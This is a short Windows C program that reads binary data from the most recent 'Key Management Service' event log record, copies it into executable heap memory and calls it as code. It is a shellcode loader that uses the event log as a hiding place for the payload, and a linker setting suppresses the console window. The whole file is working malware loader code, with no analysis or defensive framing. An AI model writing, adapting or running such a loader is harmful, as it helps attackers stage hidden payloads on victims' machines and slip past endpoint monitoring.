#include <windows.h>
#include <stdio.h>
#include <string.h>

#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
#define BUFFER_SIZE 1024


int main()
{

    HANDLE hEventLog;
    LPCTSTR lpUNCServerName = NULL;
    LPCTSTR lpSourceName = TEXT("Key Management Service");
    DWORD dwReadFlags = EVENTLOG_BACKWARDS_READ | EVENTLOG_SEQUENTIAL_READ;
    DWORD dwRecordOffset = 0;   //
    DWORD dwBytesRead = 0;
    DWORD dwMinimumBytesToRead = 0;
    DWORD dwTimeGenerated = 0;
    BYTE bBuffer[BUFFER_SIZE];
    EVENTLOGRECORD* pevlr = (EVENTLOGRECORD*)&bBuffer;

    // Open EventLog, Get Handler
    hEventLog = OpenEventLog(lpUNCServerName, lpSourceName);
    if (hEventLog == NULL)
    {
        printf("OpenEventLog failed (%d)\n", GetLastError());
        return 0;
    }

    // Read EventLog
    if (!ReadEventLog(hEventLog, dwReadFlags, dwRecordOffset, pevlr, BUFFER_SIZE, &dwBytesRead, &dwMinimumBytesToRead))
    {
        printf("ReadEventLog failed %d\n", GetLastError());
        return 0;
    }

    // Get TimeGenerated
    //dwTimeGenerated = ((EVENTLOGRECORD*)pevlr)->TimeGenerated;

    //Get Binary Data
    BYTE* pEventData = (BYTE*)pevlr + pevlr->DataOffset;


    //Loader
    HANDLE myHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    void* exec = HeapAlloc(myHeap, HEAP_ZERO_MEMORY, BUFFER_SIZE);
    memcpy(exec, pEventData, BUFFER_SIZE);
    ((void(*)())exec)();


    return 0;
}